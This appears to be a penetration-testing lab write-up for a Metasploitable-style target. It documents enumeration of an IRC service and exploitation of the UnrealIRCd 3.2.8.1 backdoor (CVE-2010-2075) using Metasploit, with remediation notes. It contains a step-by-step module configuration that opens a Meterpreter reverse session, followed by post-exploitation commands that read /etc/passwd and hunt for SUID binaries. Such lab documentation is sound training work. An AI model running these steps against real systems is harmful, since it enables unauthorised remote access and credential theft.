# UnrealIRCd (Port 6667)

## Objective

Identify the IRC service running on port 6667, enumerate it, verify the vulnerable version, exploit the UnrealIRCd backdoor, and gain remote shell access.

---

# Target Information

| Field | Value |
|-------|-------|
| Target IP | 192.168.56.104 |
| Service | IRC |
| Port | 6667 |
| Product | UnrealIRCd |
| Vulnerability | UnrealIRCd 3.2.8.1 Backdoor |
| CVE | CVE-2010-2075 |
| Severity | Critical |

---

# Enumeration

## 1. Service Version Detection

### Command

```bash
nmap -sV -p6667 192.168.56.104
```

### Output

```
6667/tcp open  irc  UnrealIRCd
```

### Screenshot

```
01-nmap-version.png
```

---

## 2. Banner Grabbing

### Netcat

```bash
nc 192.168.56.104 6667
```

### Output

```
NOTICE AUTH
Looking up your hostname...
```

Press

```
Ctrl + C
```

### Screenshot

```
02-netcat-banner.png
```

---

## 3. Nmap Banner Script

### Command

```bash
nmap --script banner -p6667 192.168.56.104
```

### Output

```
irc.Metasploitable.LAN
```

### Screenshot

```
03-banner-script.png
```

---

## 4. Search Public Exploits

### Searchsploit

```bash
searchsploit unrealircd
```

### Output

```
UnrealIRCd 3.2.8.1 - Backdoor Command Execution
```

### Screenshot

```
04-searchsploit.png
```

---

# Exploitation

## 1. Start Metasploit

```bash
msfconsole
```

---

## 2. Search Module

```text
search unrealircd
```

Output

```
exploit/unix/irc/unreal_ircd_3281_backdoor
```

### Screenshot

```
05-msf-search.png
```

---

## 3. Use Module

```text
use exploit/unix/irc/unreal_ircd_3281_backdoor
```

---

## 4. Configure Options

```text
set RHOSTS 192.168.56.104
```

```text
set LHOST 192.168.56.103
```

Verify configuration

```text
show options
```

### Screenshot

```
06-module-options.png
```

---

## 5. Execute Exploit

```text
run
```

Output

```
Meterpreter session 1 opened
```

### Screenshot

```
07-meterpreter-session.png
```

---

# Obtain Linux Shell

Inside Meterpreter

```text
shell
```

Output

```
Process created
Channel created
```

Verify access

```bash
whoami
```

```bash
hostname
```

```bash
id
```

```bash
pwd
```

### Screenshot

```
08-linux-shell.png
```

---

# Basic Enumeration

```bash
uname -a
```

```bash
cat /etc/passwd
```

```bash
sudo -l
```

```bash
find / -perm -4000 -type f 2>/dev/null
```

```bash
ls -la /home
```

```bash
ip a
```

---

# Vulnerability Details

## Name

UnrealIRCd 3.2.8.1 Backdoor

## CVE

CVE-2010-2075

## Severity

Critical

## CVSS

10.0

---

# Description

A malicious backdoor was introduced into the official UnrealIRCd 3.2.8.1 source code after the project infrastructure was compromised. Servers built from the affected source allow unauthenticated remote attackers to execute arbitrary operating system commands.

---

# Impact

- Remote Code Execution
- Complete system compromise
- Arbitrary command execution
- Data theft
- Privilege escalation
- Lateral movement

---

# Root Cause

The distributed source code contained a hidden backdoor that executes attacker-supplied commands. Any server installed from the compromised package is vulnerable.

---

# Remediation

- Upgrade to a clean version of UnrealIRCd.
- Download software only from trusted sources.
- Verify package hashes and signatures.
- Restrict IRC service exposure.
- Monitor logs for suspicious activity.
- Keep systems updated with security patches.

---

# Tools Used

- Nmap
- Netcat
- Searchsploit
- Metasploit Framework

---

# Attack Flow

```
Port Scan
      │
      ▼
Service Detection
      │
      ▼
Banner Grabbing
      │
      ▼
Searchsploit
      │
      ▼
Metasploit Module
      │
      ▼
Remote Code Execution
      │
      ▼
Meterpreter Session
      │
      ▼
Linux Shell
      │
      ▼
Post Exploitation Enumeration
```

---

# Screenshots Checklist

```
01-nmap-version.png

02-netcat-banner.png

03-banner-script.png

04-searchsploit.png

05-msf-search.png

06-module-options.png

07-meterpreter-session.png

08-linux-shell.png
```

---

# Status

- Service Identified ✅
- Version Enumerated ✅
- Banner Grabbed ✅
- Exploit Found ✅
- Exploited Successfully ✅
- Meterpreter Obtained ✅
- Linux Shell Obtained ✅
- Enumeration Completed ✅